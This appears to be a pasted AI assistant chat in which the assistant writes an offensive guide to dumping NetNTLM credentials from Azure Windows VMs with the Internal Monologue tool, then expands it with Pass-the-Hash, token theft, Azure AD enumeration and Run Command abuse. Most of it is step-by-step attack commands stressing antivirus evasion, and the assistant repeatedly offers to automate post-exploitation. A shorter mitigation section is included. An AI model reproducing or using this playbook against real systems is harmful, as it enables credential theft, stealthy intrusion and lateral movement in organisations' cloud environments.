## Credential dumping with Internal Monologue

Certainly! Here's a **corrected, summarized, and detailed step-by-step guide** for performing pentesting on Azure Windows/Linux VMs targeting **Local accounts, AD accounts, and Microsoft Entra ID accounts** using the **Internal Monologue attack** (credential dumping without Mimikatz), including commands, exploitation steps, vulnerabilities exploited, and all necessary details — duplicates removed and clarity improved:

------------------------------------------------------------------------

**Pentesting Azure VMs: Credential Dumping Using Internal Monologue Attack**

**Introduction**

- Traditional credential dumping tools like **Mimikatz** are often detected by antivirus and endpoint protection.

- **Internal Monologue** attack offers a stealthier way to extract **NetNTLMv1/v2 hashes** without dropping suspicious tools.

- The attack abuses Windows authentication mechanisms by **downgrading NTLM authentication** and extracting challenge-response hashes from local logon sessions.

- These hashes can be cracked offline or used directly for lateral movement (Pass-the-Hash).

- Particularly relevant in Azure environments where Windows VMs may expose legacy authentication or weak NTLM configurations.

------------------------------------------------------------------------

**Background: What is Internal Monologue?**

- Windows uses **NTLM** protocol where servers issue an 8-byte challenge and the client responds with a hash based on the user's password (MD4 hash).

- **NetNTLMv1** is outdated and vulnerable; often disabled but can be **downgraded by attacker manipulation**.

- Internal Monologue **invokes local NTLM authentication APIs** to capture these challenge-response hashes **without network interaction**.

- It also temporarily **modifies registry keys (e.g., LMCompatibilityLevel)** to enable downgraded NTLM communication locally.

- Hashes extracted represent credentials of currently logged-in users on the compromised host.

------------------------------------------------------------------------

**Exploitation Steps**

**Step 1: Obtain Foothold on Azure VM**

- The attacker must already have some form of remote code execution or access on the target VM (local admin, remote shell, etc.).

**Step 2: Transfer or Invoke InternalMonologue Tool**

**Option A: Using the precompiled executable**

- Download from GitHub or trusted repository.

- Transfer InternalMonologue.exe to the Azure VM (e.g., via SCP, SMB share, or Invoke-WebRequest in PowerShell).

\# Example PowerShell command to download

Invoke-WebRequest -Uri "https://github.com/.../InternalMonologue.exe" -OutFile "C:\Temp\InternalMonologue.exe"

- Run the executable with parameters:

InternalMonologue.exe -Downgrade true -Threads true -Impersonate true

- This will:

  - Downgrade NTLM version to vulnerable v1 locally.

  - Use multiple threads for performance.

  - Impersonate logged-on users to extract their NetNTLM hashes.

**Option B: Using PowerShell Empire module (stealthier)**

- If you have a **PowerShell Empire** agent on the target:

usemodule credentials/invoke_internal_monologue

execute

- This avoids transferring any binary, reducing detection risks.

------------------------------------------------------------------------

**Step 3: Capture the NetNTLM Hashes**

- The tool outputs hashes for currently logged-in users.

- Example captured hash for user raj:

raj:NetNTLMv1/v2 Hash...

------------------------------------------------------------------------

**Step 4: Crack the Hash Offline (Optional)**

- Save the extracted hash to a file on your attacking machine, e.g., hash.txt.

echo "\<captured_hash\>" \> hash.txt

- Use **John the Ripper** to crack:

john --format=netntlm hash.txt --show

- Result:

raj:123

------------------------------------------------------------------------

**Step 5: Use Hash for Pass-the-Hash or Lateral Movement**

- With the hash, the attacker can authenticate to other systems without knowing the plaintext password, enabling lateral movement and privilege escalation within the network.

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

- **Legacy authentication enabled:** NTLMv1 is either enabled or downgraded locally by attacker.

- **Insufficient endpoint protection:** Allows execution of unsigned tools or PowerShell scripts.

- **Registry writable:** Allows temporary modification of LMCompatibilityLevel keys.

- **No MFA enforcement:** Local or AD credentials alone provide access.

- **Poor network segmentation:** Enables lateral movement once credentials are harvested.

------------------------------------------------------------------------

**Summary of Commands and Actions**

| **Step** | **Commands / Actions** |
|----|----|
| Download executable | Invoke-WebRequest -Uri \<url\> -OutFile InternalMonologue.exe |
| Run InternalMonologue | InternalMonologue.exe -Downgrade true -Threads true -Impersonate true |
| PowerShell Empire | usemodule credentials/invoke_internal_monologue + execute |
| Crack Hash | john --format=netntlm hash.txt --show |

------------------------------------------------------------------------

**Conclusion**

- **Internal Monologue attack is a stealthy alternative to Mimikatz** for dumping credentials from Azure Windows VMs.

- It bypasses many antivirus detections by invoking native Windows APIs rather than injecting malicious code.

- Effective due to NTLM protocol weaknesses and registry tweakability.

- Azure defenders should disable legacy NTLM versions, enforce MFA, monitor registry changes, and implement strong endpoint protections.

------------------------------------------------------------------------

If you want, I can also provide detailed mitigation strategies or expand this with post-exploitation steps tailored for Azure AD / Microsoft Entra ID environments!

Great! Here’s an **expanded version including detailed post-exploitation steps tailored for Azure AD (Microsoft Entra ID) and mitigation strategies** for this Internal Monologue pentest scenario on Azure Windows VMs:

------------------------------------------------------------------------

**Expanded Internal Monologue Pentest Guide for Azure Windows VMs**

**Including Post-Exploitation on Azure AD (Microsoft Entra ID) and Mitigation**

------------------------------------------------------------------------

**Recap: Internal Monologue Attack**

- Dumps NetNTLM hashes by downgrading NTLM auth locally

- Extracts credentials stealthily without Mimikatz

- Works on local/AD accounts on Azure Windows VMs

------------------------------------------------------------------------

**Post-Exploitation Steps for Azure AD / Microsoft Entra ID**

**1. Use Extracted Credentials for Lateral Movement**

- Use **Pass-the-Hash** tools (e.g., pth-toolkit, Impacket’s psexec.py) with dumped hashes:

\# Example with Impacket psexec:

psexec.py -hashes \<LMHASH\>:\<NTHASH\> domain\\raj@target-ip

- Move laterally between Azure VMs joined to the domain.

**2. Enumerate Azure AD / Entra ID Details**

- If the VM is Azure AD Joined or Hybrid Joined, use **Azure AD PowerShell modules** to query info:

\# Connect to Azure AD (requires permissions)

Connect-AzureAD

\# List users

Get-AzureADUser

\# List groups

Get-AzureADGroup

- Use **Azure CLI** or **Microsoft Graph API** for enumeration if tokens or user creds are available.

**3. Attempt Privilege Escalation in Azure AD**

- Look for **weakly protected service principals, app registrations, or stale credentials**.

- Tools like **AzureADInternals** or **BloodHound/SharpHound** (with AzureHound module) can map relationships:

\# Example BloodHound AzureHound data collection

Invoke-AzureHound -CollectionMethod All -OutputDirectory .\\

- Exploit **over-permissioned roles** (e.g., Global Admin, Application Administrator) if credentials or tokens allow.

**4. Token Theft and Abuse**

- Extract **OAuth tokens** or **refresh tokens** from local browser cache or token stores.

- Use these tokens to impersonate users or request elevated permissions.

**5. Azure VM Run Command / Automation Abuse**

- Abuse **Azure VM Run Command** to execute further commands remotely if you have adequate access:

az vm run-command invoke --command-id RunPowerShellScript --name \<vm-name\> --resource-group \<rg\> --scripts "whoami"

- Automate lateral movement and persistence via Azure automation or Azure Functions if compromised.

------------------------------------------------------------------------

**Mitigation Strategies**

**1. Disable Legacy NTLM Versions**

- Set **LMCompatibilityLevel** registry key to enforce NTLMv2 or disable NTLMv1:

\# Set NTLMv2 only (Value 5)

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5

- Use **Group Policy** to enforce this across all domain-joined machines.

**2. Enforce MFA for Azure AD Accounts**

- Require **Multi-Factor Authentication** for all privileged and user accounts.

- Use **Conditional Access policies** to enforce risk-based access.

**3. Restrict Local Admin Rights**

- Minimize users with local administrator rights on Azure VMs.

- Use **Just-In-Time (JIT) access** and **Privileged Access Workstations (PAWs)**.

**4. Endpoint Detection and Response (EDR)**

- Deploy EDR tools that detect **registry modifications**, **NTLM downgrade attempts**, and **unusual authentication patterns**.

- Monitor **process creation logs** for suspicious PowerShell Empire modules or unknown binaries.

**5. Network Segmentation and Monitoring**

- Segment Azure VNETs to limit lateral movement.

- Monitor SMB and NTLM traffic for downgrade attempts and unusual authentication.

**6. Audit and Harden Azure AD**

- Regularly audit **Azure AD roles, app registrations, and service principals**.

- Remove stale credentials and unused permissions.

- Enable **Azure AD Privileged Identity Management (PIM)**.

**Summary Table: Pentest Workflow and Mitigation**

| **Phase** | **Pentest Actions** | **Azure VM Vulnerability** | **Mitigation** |
|----|----|----|----|
| Initial Foothold | Exploit weak credentials or RCE | Weak local creds, exposed RDP/SSH | Harden passwords, limit RDP/SSH |
| Internal Monologue | Run tool to dump NTLM hashes | NTLMv1 enabled, registry writable | Disable NTLMv1, enforce NTLMv2 |
| Hash Cracking | Crack hashes offline with John the Ripper | Weak passwords | Enforce strong passwords, MFA |
| Lateral Movement | Pass-the-Hash with dumped credentials | Flat network, excessive privileges | Network segmentation, limit admin rights |
| Azure AD Enumeration | Query Azure AD data with credentials or tokens | Over-permissioned accounts | Audit permissions, remove stale accounts |
| Privilege Escalation | Abuse roles, app registrations | Misconfigured roles and apps | PIM, app registration hardening |
| Persistence & Automation | Abuse Run Command, Azure Functions | Unrestricted Azure automation access | RBAC, monitoring, just-in-time access |

------------------------------------------------------------------------

Would you like me to also generate **sample PowerShell or Azure CLI scripts** for these post-exploitation tasks, or help build an automated pentest checklist/report?

Sure! Below are detailed **Azure CLI scripts** that you can use during post-exploitation on Azure Windows/Linux VMs to enumerate and interact with Azure AD (Microsoft Entra ID) after dumping credentials like in the Internal Monologue attack. These scripts assume you have valid access tokens or credentials (user/password or token) to authenticate.

------------------------------------------------------------------------

**Azure CLI Post-Exploitation Scripts for Azure AD (Microsoft Entra ID)**

------------------------------------------------------------------------

**1. Login to Azure CLI with Credentials or Token**

If you have username/password or service principal credentials:

\# Login interactively (if possible)

az login

\# OR login with service principal (if you have app ID and secret)

az login --service-principal -u \<appId\> -p \<password-or-cert\> --tenant \<tenantId\>

------------------------------------------------------------------------

**2. List All Azure AD Users**

az ad user list --query '\[\].{Name:displayName, UserPrincipalName:userPrincipalName, ID:objectId}' -o table

------------------------------------------------------------------------

**3. Get Details of a Specific User**

az ad user show --id user@domain.com

------------------------------------------------------------------------

**4. List All Azure AD Groups**

az ad group list --query '\[\].{GroupName:displayName, ID:objectId}' -o table

------------------------------------------------------------------------

**5. List Members of a Specific Group**

az ad group member list --group "\<group-object-id-or-name\>" --query '\[\].{Name:displayName, UserPrincipalName:userPrincipalName}' -o table

------------------------------------------------------------------------

**6. Check Role Assignments for a User**

az role assignment list --assignee user@domain.com --query '\[\].{Role:roleDefinitionName, Scope:scope}' -o table

------------------------------------------------------------------------

**7. List All App Registrations (Service Principals)**

az ad app list --query '\[\].{AppName:displayName, AppId:appId, ObjectId:objectId}' -o table

------------------------------------------------------------------------

**8. Get Details of a Specific App Registration**

az ad app show --id \<appId\>

------------------------------------------------------------------------

**9. Enumerate Azure VM Run Command History**

Azure CLI can query VM run command invocations if you have access:

az vm run-command list --resource-group \<resource-group\> --name \<vm-name\> -o table

------------------------------------------------------------------------

**10. Execute a Command Remotely on the Azure VM**

If you have permission to invoke run commands on the VM:

az vm run-command invoke --command-id RunPowerShellScript --name \<vm-name\> --resource-group \<resource-group\> --scripts "whoami"

Replace RunPowerShellScript with RunShellScript for Linux VMs and adjust the commands accordingly.

------------------------------------------------------------------------

**11. List Azure AD Roles and Assignments**

az role definition list --query '\[\].{RoleName:roleName, Description:description}' -o table

az role assignment list --all --query '\[\].{PrincipalName:principalName, Role:roleDefinitionName, Scope:scope}' -o table

------------------------------------------------------------------------

**12. Check Azure AD Sign-In Logs (Requires proper permissions)**

az monitor log-analytics query -w \<workspace-id\> --analytics-query "SigninLogs \| take 10"

------------------------------------------------------------------------

**Additional Tips**

- Combine queries with jq or grep to filter data as needed.

- Export output as JSON (-o json) for further offline analysis.

- Automate script execution in bash or PowerShell scripts for repetitive enumeration.

------------------------------------------------------------------------

If you want, I can help you build a full **automated Azure AD post-exploitation script** that chains these commands based on your access level. Would you like that?
